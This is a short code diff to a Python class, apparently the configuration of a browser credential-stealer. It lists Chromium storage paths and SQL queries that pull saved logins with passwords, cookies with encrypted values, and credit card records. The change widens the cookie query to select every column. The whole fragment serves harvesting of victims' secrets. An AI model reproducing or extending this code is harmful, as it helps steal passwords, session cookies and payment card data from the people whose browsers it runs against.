@@ -8,7 +8,7 @@ class ChromiumConfig:
 
     Variables: tuple = ("browser_name", "storage_path", "storage_folder", "state_path", "cookies_path", "passwords_path", "cards_path", "alt_cookies_path", "statuses", "errors")
     PasswordsSQL: str = "SELECT action_url, username_value, password_value FROM logins"
-    CookiesSQL: str = "SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies"
+    CookiesSQL: str = "SELECT * FROM cookies"
     CardsSQL: str = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
 
 
